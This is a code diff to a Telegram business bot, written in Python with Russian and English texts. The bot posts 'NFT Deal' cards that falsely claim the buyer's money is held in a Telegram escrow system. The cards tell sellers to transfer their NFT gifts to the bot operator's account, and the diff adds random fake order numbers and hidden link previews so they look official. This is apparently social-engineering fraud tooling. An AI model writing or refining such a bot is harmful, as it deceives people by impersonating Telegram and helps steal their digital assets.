@@ -1,7 +1,9 @@
 import asyncio
 import logging
 import os
+import random
 import re
+import string
 import time
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
@@ -13,6 +15,7 @@ from aiogram.types import (
     BusinessConnection,
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.utils.markdown import hide_link
 
 # ================= НАСТРОЙКИ =================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -37,6 +40,14 @@ dp = Dispatcher()
 
 active_deals = {}
 deal_timers = {}
+
+
+# ================= ГЕНЕРАЦИЯ ОРДЕРА =================
+def generate_order_id():
+    """Уникальный ордер вида TG-A7K9P2X4 (8 символов)."""
+    chars = string.ascii_uppercase + string.digits
+    code = "".join(random.choice(chars) for _ in range(8))
+    return f"TG-{code}"
 
 
 # ================= ТЕКСТЫ =================
@@ -66,6 +77,7 @@ TEXTS = {
         ),
         "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
         "deal_title": "NFT Deal",
+        "order_prefix": "Ордер",
         "buyer_reserved": "Покупатель зарезервировал",
         "via_escrow": "через эскроу-систему Telegram.",
         "escrow_text": (
@@ -73,10 +85,9 @@ TEXTS = {
             "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
         ),
         "instructions": "Инструкция для завершения сделки:",
-        "step1": f"1. Передайте подарок пользователю: <b>@{RECIPIENT_USERNAME}</b>",
-        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
+        "step1": "1. Передайте подарок пользователю: {recipient}",
+        "step2_prefix": "2. Нажмите «Передать NFT» и выберите {nft}",
         "step3": "3. Подтвердите передачу подарка.",
-        "link_to_gift": "Ссылка на подарок",
         "final_note": (
             "Telegram зафиксирует транзакцию и моментально зачислит "
             "<b>{amount} {currency}</b> на ваш баланс. Резерв действует 24 часа."
@@ -108,6 +119,7 @@ TEXTS = {
         ),
         "deal_lost": "⚠️ Error: deal data lost.",
         "deal_title": "NFT Deal",
+        "order_prefix": "Order",
         "buyer_reserved": "The buyer has reserved",
         "via_escrow": "via the Telegram escrow system.",
         "escrow_text": (
@@ -115,10 +127,9 @@ TEXTS = {
             "credited to your Telegram Stars balance right after the gift is transferred."
         ),
         "instructions": "Instructions to complete the deal:",
-        "step1": f"1. Transfer the gift to: <b>@{RECIPIENT_USERNAME}</b>",
-        "step2_prefix": "2. Click «Transfer NFT» and choose",
+        "step1": "1. Transfer the gift to: {recipient}",
+        "step2_prefix": "2. Click «Transfer NFT» and choose {nft}",
         "step3": "3. Confirm the gift transfer.",
-        "link_to_gift": "Gift link",
         "final_note": (
             "Telegram will credit <b>{amount} {currency}</b> to your balance. "
             "Reservation valid 24 hours."
@@ -180,7 +191,9 @@ def format_currency(currency: str) -> str:
 
 def build_offer_text(t, nft_name, nft_number, nft_url, amount, currency, seconds_left,
                      author_name, author_id):
-    """Карточка оффера — как было."""
+    """Карточка оффера со скрытой ссылкой (hide_link) + превью."""
+    hidden = hide_link(nft_url)
+
     nft_display = (
         f'<a href="{nft_url}">{nft_name} #{format_number(nft_number)}</a>'
     )
@@ -188,6 +201,7 @@ def build_offer_text(t, nft_name, nft_number, nft_url, amount, currency, seconds
     cur = format_currency(currency)
 
     return (
+        f"{hidden}"
         f"<b>{t['header']}</b>\n"
         f"{nft_display}\n\n"
         f"{t['offer'].format(author=author_display)}\n"
@@ -206,17 +220,43 @@ def build_offer_keyboard(t, deal_id, lang):
 
 
 def build_final_text(t, deal):
+    """
+    Финальный экран:
+    - Уникальный ордер
+    - НИК АВТОРА (.buy) кликабельно → профиль
+    - NFT-название кликабельно + #30,895 с запятой
+    - БЕЗ строки "Ссылка на подарок"
+    """
+    # NFT → имя и номер с запятой
+    nft_title = deal["title"]
+    parts = nft_title.rsplit("#", 1)
+    if len(parts) == 2:
+        nft_name_clean = parts[0].strip()
+        nft_num_fmt = format_number(parts[1].strip())
+        nft_display = (
+            f'<a href="{deal["link"]}">{nft_name_clean} #{nft_num_fmt}</a>'
+        )
+    else:
+        nft_display = f'<a href="{deal["link"]}">{nft_title}</a>'
+
+    # ✅ НИК АВТОРА (.buy) — кликабельно на профиль
+    author_display = (
+        f'<a href="tg://user?id={deal["author_id"]}">{deal["author_name"]}</a>'
+    )
+
+    cur = format_currency(deal["currency"])
+    order_id = deal["order_id"]
+
     return (
         f"<b>{t['deal_title']}</b>\n\n"
-        f"Ордер #TG-D721BSTP\n\n"
-        f"{t['buyer_reserved']} <b>{deal['amount']} {format_currency(deal['currency'])}</b> {t['via_escrow']}\n"
+        f"{t['order_prefix']} #{order_id}\n\n"
+        f"{t['buyer_reserved']} <b>{deal['amount']} {cur}</b> {t['via_escrow']}\n"
         f"{t['escrow_text']}\n\n"
         f"<b>{t['instructions']}</b>\n"
-        f"{t['step1']}\n"
-        f"{t['step2_prefix']} <b>{deal['title']}</b>\n"
+        f"{t['step1'].format(recipient=author_display)}\n"
+        f"{t['step2_prefix'].format(nft=nft_display)}\n"
         f"{t['step3']}\n\n"
-        f"{t['link_to_gift']}: {deal['link']}\n\n"
-        f"{t['final_note'].format(amount=deal['amount'], currency=format_currency(deal['currency']))}"
+        f"{t['final_note'].format(amount=deal['amount'], currency=cur)}"
     )
 
 
@@ -227,7 +267,7 @@ def build_final_keyboard(t, deal, deal_id, lang):
     return b
 
 
-# ================= ТАЙМЕР ОФФЕРА =================
+# ================= ТАЙМЕР =================
 async def offer_timer(deal_id: str):
     deal = active_deals.get(deal_id)
     if not deal:
@@ -283,7 +323,7 @@ async def offer_timer(deal_id: str):
                         message_id=deal["message_id"],
                         reply_markup=kb,
                         parse_mode="HTML",
-                        disable_web_page_preview=True,
+                        disable_web_page_preview=False,
                     )
             except Exception as e:
                 if "MESSAGE_ID_INVALID" not in str(e):
@@ -382,12 +422,12 @@ async def process_buy(message: Message, bc_id):
                 message_id=message.message_id,
                 reply_markup=kb,
                 parse_mode="HTML",
-                disable_web_page_preview=True,
+                disable_web_page_preview=False,
             )
         else:
             await message.answer(
                 text=text, reply_markup=kb,
-                parse_mode="HTML", disable_web_page_preview=True,
+                parse_mode="HTML", disable_web_page_preview=False,
             )
     except Exception as e:
         if "MESSAGE_ID_INVALID" not in str(e):
@@ -481,12 +521,12 @@ async def process_test(message: Message, bc_id):
                 chat_id=message.chat.id,
                 message_id=message.message_id,
                 parse_mode="HTML",
-                disable_web_page_preview=True,
+                disable_web_page_preview=False,
             )
         else:
             await message.answer(
                 text=text,
-                parse_mode="HTML", disable_web_page_preview=True,
+                parse_mode="HTML", disable_web_page_preview=False,
             )
     except Exception as e:
         if "MESSAGE_ID_INVALID" not in str(e):
@@ -514,7 +554,7 @@ async def process_test(message: Message, bc_id):
     deal_timers[deal_id] = asyncio.create_task(offer_timer(deal_id))
 
 
-# ================= ЕДИНЫЙ ОБРАБОТЧИК BUSINESS =================
+# ================= BUSINESS =================
 @dp.business_message()
 async def handle_business_message(message: Message):
     bc_id = message.business_connection_id
@@ -541,7 +581,7 @@ async def handle_business_message(message: Message):
         return
 
 
-# ================= ОБЫЧНЫЙ БОТ В ЛС =================
+# ================= ОБЫЧНЫЙ БОТ =================
 @dp.message(Command("buy"))
 @dp.message(F.text.startswith(".buy"))
 async def handle_regular_buy(message: Message):
@@ -555,7 +595,6 @@ async def handle_regular_test(message: Message):
     await process_test(message, None)
 
 
-# ================= BUSINESS CONNECTION =================
 @dp.business_connection()
 async def on_business_connection(conn: BusinessConnection):
     logging.info(
@@ -600,6 +639,10 @@ async def process_accept(cb: CallbackQuery):
     stop_timer(deal_id)
     await cb.answer(text=t["alert_title"], show_alert=True)
     await asyncio.sleep(2)
+
+    # ✅ Уникальный ордер
+    deal["order_id"] = generate_order_id()
+
     text = build_final_text(t, deal)
     kb = build_final_keyboard(t, deal, deal_id, lang).as_markup()
     try:
@@ -611,12 +654,12 @@ async def process_accept(cb: CallbackQuery):
                 message_id=deal["message_id"],
                 reply_markup=kb,
                 parse_mode="HTML",
-                disable_web_page_preview=True,
+                disable_web_page_preview=False,
             )
         else:
             await cb.message.edit_text(
                 text=text, reply_markup=kb,
-                parse_mode="HTML", disable_web_page_preview=True,
+                parse_mode="HTML", disable_web_page_preview=False,
             )
     except Exception as e:
         if "MESSAGE_ID_INVALID" not in str(e):
@@ -652,7 +695,7 @@ async def handle(request):
 
 
 async def main():
-    logging.info("[START] Bot started — .buy + .test")
+    logging.info("[START] Bot started — уникальный ордер + кликабельный автор")
 
     app = web.Application()
     app.router.add_get("/", handle)
